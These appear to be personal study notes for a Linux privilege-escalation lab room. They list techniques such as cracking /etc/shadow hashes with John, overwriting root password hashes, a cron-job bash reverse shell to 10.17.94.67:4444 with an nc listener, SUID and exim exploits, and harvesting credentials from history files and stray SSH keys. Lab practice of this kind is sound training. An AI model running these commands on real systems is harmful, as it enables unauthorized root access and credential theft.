
##### _Linux PrivEsc Room_
- run the LinEnum.sh script and we see that `MYSQL Service` is running as root and we can login as root into mysql without a password
- it is a [popular exploit](https://www.exploit-db.com/exploits/1518) 
![[Pasted image 20240116102745.png]]  

- Readable /etc/shadow - we can read the hashes of `root` and `user` and we use `hashid` on hash.txt and find out what hash it is and try to crack it using `John` 
>`echo"$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0" > hash.txt`
>`hashid hash.txt` - this tells us that it is SHA512 Crypt
>`john --wordlist=rockyou.txt hash.txt` - cracked password is `password123` 

- Insert and create a new password hash and replace it with the existing root hash and then login as `sudo su` with new created password
> `mkpasswd -m SHA-512 helloworld` - here _helloworld_ is the password
> but while replacing remember to append the already existing parameters in hash `root:$6$qZ4oaFSLh1.ovG/U$1RRGcAnSk2YAfu5ibBMYPv.jUboKF3cu06RlYV19PGlsaGbHS.ZJT6JDBpxxGo.5Rs3fp22yfctycoVArnGHt.:17298:0:99999:7:::` - where `:17298:0:99999:7:::` is default  (hash for _helloworld_)

- writable /etc/passwd - do `openssl passwd [newpassword]` and whatever hash we get, write it to the /etc/passwd file to root by replacing 'x' and now do `su` and enter password and we get root shell
- Cron Jobs - File Permissions --> `cat /etc/crontab` and we see `overwrite.sh` being run every minute so we overwrite the contents of it and replace it by 
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.17.94.67/4444 0>&1
```
now set up `nc -lvnp 4444` on attacking machine and listen for the root shell which will be obtained in a minute after the cronjob is executed.\

###### _SUID/SGID Executables_
- to find all SUID/SGID executables on the debian VM
> `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` - this shows us all the SUID/GUID executables and we see `/usr/sbin/exim-4.84-3` appears in the results.
> `/home/user/tools/suid/exim/cve-2016-1531.sh` - running this gives us the root access

###### _Passwords and Keys_
- if user accidentally types his password on commandline instead of into password prompt, it may get recorded onto a history file which we can access by `cat ~/.*history | less` and here user has logged into his `mysql` and revealed password
- sometimes plaintext passwords can also be found in config files, so in `cat /home/user/myvpn.ovpn` , we can see root user credentials in `/etc/openvpn/auth.txt` 
- sometimes hidden files and keys, we can find `ssh root keys` so make sure to do `ls -la /`, there appears to be a hidden directory `.ssh` , now copy over the private key & save it in a file, give it permissions by `chmod 600 [filename]` and then do `ssh -i root-key root@[IP]` and we get access

###### _Kernel Exploits_
- This is the last resort to get a root shell, if everything else doesnt work, there are several famous exploits and we are going to use the `dirty cow exploit`
